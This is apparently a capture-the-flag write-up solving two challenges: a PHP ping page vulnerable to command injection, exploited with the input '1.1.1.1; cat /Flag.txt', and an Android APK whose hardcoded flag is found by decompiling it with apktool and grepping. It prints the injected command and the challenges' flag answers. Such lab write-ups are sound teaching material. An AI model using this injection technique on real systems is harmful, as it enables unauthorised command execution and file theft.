# Ryan CTF: Advanced

### Input Validation

This is a simple command injection, the php is executing the line `exec("ping -c 4 " . $_GET["ip"], $out);`, with the `GET` parameter `ip` that we control.
This way, similarly to SQL injection, we can end the `ping` command with a semicolon `;` (in linux) and the write the second command afterwards. 
Let's try to give the input `1.1.1.1; cat /Flag.txt`, we get 

```
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data. 
64 bytes from 1.1.1.1: icmp_seq=1 ttl=55 time=13.0 ms 
64 bytes from 1.1.1.1: icmp_seq=2 ttl=55 time=12.3 ms 
64 bytes from 1.1.1.1: icmp_seq=3 ttl=55 time=12.2 ms 
64 bytes from 1.1.1.1: icmp_seq=4 ttl=55 time=12.3 ms 

--- 1.1.1.1 ping statistics --- 
4 packets transmitted, 4 received, 0% packet loss, time 3003ms 
rtt min/avg/max/mdev = 12.253/12.502/13.068/0.338 ms 
Flag: pluripresence 
```


### These are not the droids...

We can decompile the APK with `apktool d` command, then navigate to `smali`, `yanl`, `helloworld`, which seems to be the path to the source code.
We have a few class files in there, let's do a `grep -ri "flag" .` just to make sure.
And yes, we've got the string `./BuildConfig.smali:.field public static final FLAG:Ljava/lang/String; = "FLAG: harmonograph"`